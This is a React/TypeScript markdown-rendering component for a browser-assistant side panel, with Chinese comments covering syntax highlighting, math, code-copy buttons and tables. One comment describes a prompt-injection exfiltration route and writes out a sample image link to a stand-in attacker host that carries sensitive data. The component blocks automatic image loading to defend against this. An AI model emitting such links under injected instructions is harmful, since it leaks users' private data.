import { memo, useEffect, useRef, useState, type ComponentPropsWithoutRef } from 'react';
import ReactMarkdown, { type Options } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import remarkBreaks from 'remark-breaks';
import remarkMath from 'remark-math';
import rehypeHighlight from 'rehype-highlight';
import rehypeKatex from 'rehype-katex';
import 'highlight.js/styles/github.css';
import 'katex/dist/katex.min.css';
import { normalizeMathDelimiters } from '@/lib/chat/math-delimiters';
import { useTranslation } from '@/lib/i18n';
import { IconCheck, IconCopy } from './icons';

import bash from 'highlight.js/lib/languages/bash';
import css from 'highlight.js/lib/languages/css';
import diff from 'highlight.js/lib/languages/diff';
import json from 'highlight.js/lib/languages/json';
import javascript from 'highlight.js/lib/languages/javascript';
import python from 'highlight.js/lib/languages/python';
import typescript from 'highlight.js/lib/languages/typescript';
import xml from 'highlight.js/lib/languages/xml';
import yaml from 'highlight.js/lib/languages/yaml';

// rehype-highlight 默认注册 lowlight 的 `common` 语言集（37 种），
// 其中多数（rust/kotlin/swift/vbnet/wasm...）与浏览器助手场景无关，白白增大 sidepanel 包体。
// 这里只注册页面/脚本类场景实际会用到的语言。
export const HIGHLIGHT_LANGUAGES = {
  bash,
  shell: bash,
  css,
  diff,
  json,
  javascript,
  js: javascript,
  jsx: javascript,
  python,
  py: python,
  typescript,
  ts: typescript,
  tsx: typescript,
  xml,
  html: xml,
  yaml,
  yml: yaml,
};

// remarkPlugins/rehypePlugins/components 数组和对象字面量提到模块作用域：
// 内联在组件体里会在每次渲染都创建新的数组/对象实例，即使 content 没变，
// react-markdown 也会认为插件配置变化而跳过内部的 memo 优化。
// remarkBreaks：CommonMark 把段内单个换行当空格处理，划词翻译/润色等场景里
// 选中文本常是单换行分隔的多行/多段（浏览器 selection.toString() 不会插入空行），
// 模型照原文换行结构回传后，不加这个插件会被渲染成挤在一起的一段话。
// remarkMath + rehypeKatex：渲染 $…$ / $$…$$ 公式；\(…\)、\[…\] 和价格里的 $ 由
// normalizeMathDelimiters 先行处理。KaTeX 解析失败（如流式中公式还没写完）时原文标红显示，不抛错。
const REMARK_PLUGINS = [remarkGfm, remarkBreaks, remarkMath];
const REHYPE_PLUGINS: NonNullable<Options['rehypePlugins']> = [
  rehypeKatex,
  [rehypeHighlight, { languages: HIGHLIGHT_LANGUAGES }],
];
// 图片不自动加载：回答内容可能受网页里的提示注入操纵，模型一旦输出
// ![](https://攻击者/?d=<敏感内容>)，<img> 渲染瞬间就会把数据带出去，用户什么都不用做。
// 扩展页面的默认 CSP 不限制 img-src，脱敏也拦不住任意文本，所以在渲染层直接不发请求：
// 换成一个显示 alt 和域名的链接，用户主动点击才打开。
function MarkdownImage({ src, alt }: ComponentPropsWithoutRef<'img'> & { node?: unknown }) {
  const { t } = useTranslation();
  const label = `${t('chat.markdownImageLabel')}${alt ? `: ${alt}` : ''}`;
  let host = '';
  try {
    const url = typeof src === 'string' ? new URL(src) : null;
    if (url && (url.protocol === 'http:' || url.protocol === 'https:')) host = url.host;
  } catch {
    // 相对地址或非法地址：只显示文字
  }
  if (!host) return <span className="md-image-placeholder">[{label}]</span>;
  return (
    <a
      className="md-image-placeholder"
      href={src}
      target="_blank"
      rel="noreferrer"
      title={t('chat.markdownImageTitle', { url: src as string })}
    >
      [{label} · {host}]
    </a>
  );
}

// 代码块复制按钮：回答里经常给出选择器、脚本、CSS 片段，用户只想要代码本身而不是整条消息。
// 复制时读 <pre> 的 textContent——高亮后的 code 被拆成很多 span，DOM 文本就是原始代码。
function MarkdownPre({ node: _node, children, ...props }: ComponentPropsWithoutRef<'pre'> & { node?: unknown }) {
  const { t } = useTranslation();
  const preRef = useRef<HTMLPreElement>(null);
  const [copied, setCopied] = useState(false);
  const timeoutRef = useRef<number | null>(null);

  useEffect(() => () => {
    if (timeoutRef.current !== null) window.clearTimeout(timeoutRef.current);
  }, []);

  async function copy() {
    const text = (preRef.current?.textContent ?? '').replace(/\n$/, '');
    try {
      await navigator.clipboard.writeText(text);
    } catch {
      return;
    }
    setCopied(true);
    if (timeoutRef.current !== null) window.clearTimeout(timeoutRef.current);
    timeoutRef.current = window.setTimeout(() => setCopied(false), 2000);
  }

  const label = t(copied ? 'chat.copiedLabel' : 'chat.copyCodeAriaLabel');
  return (
    <div className="md-pre-wrap">
      <pre ref={preRef} {...props}>{children}</pre>
      <button type="button" className="md-copy-code" onClick={() => void copy()} aria-label={label} title={label}>
        {copied ? <IconCheck className="h-3.5 w-3.5" /> : <IconCopy className="h-3.5 w-3.5" />}
      </button>
    </div>
  );
}

const MARKDOWN_COMPONENTS = {
  a: ({ node: _node, ...props }: ComponentPropsWithoutRef<'a'> & { node?: unknown }) => (
    <a {...props} target="_blank" rel="noreferrer" />
  ),
  img: MarkdownImage,
  pre: MarkdownPre,
  table: ({ node: _node, ...props }: ComponentPropsWithoutRef<'table'> & { node?: unknown }) => (
    <div className="md-table-wrap">
      <table {...props} />
    </div>
  ),
};

// 表格单独套一层可横向滚动的容器：侧边栏只有三四百像素宽，react-markdown 直接吐出的
// <table> 在这个宽度下要么把列挤成每行一两个字，要么撑破容器——两种都不可用。包一层
// overflow-x 的 div，再让表格按内容宽度排版（见 tailwind.css 的 .md-table-wrap），
// 宽表格就变成容器内横向滚动，页面本身不会被撑开。
//
// memo 包裹：流式输出期间父级 Message 组件会因为不相关的 store 更新（输入框打字、
// 其他消息的活动步骤）而重渲染，content 没变时这里必须跳过整棵 remark/rehype-highlight
// 解析树的重建，否则长对话历史里每条消息都要在无关按键上白跑一遍高亮解析。
function Markdown({ content }: { content: string }) {
  return (
    <div className="md-body text-sm leading-relaxed">
      <ReactMarkdown
        remarkPlugins={REMARK_PLUGINS}
        rehypePlugins={REHYPE_PLUGINS}
        components={MARKDOWN_COMPONENTS}
      >
        {normalizeMathDelimiters(content)}
      </ReactMarkdown>
    </div>
  );
}

export default memo(Markdown);
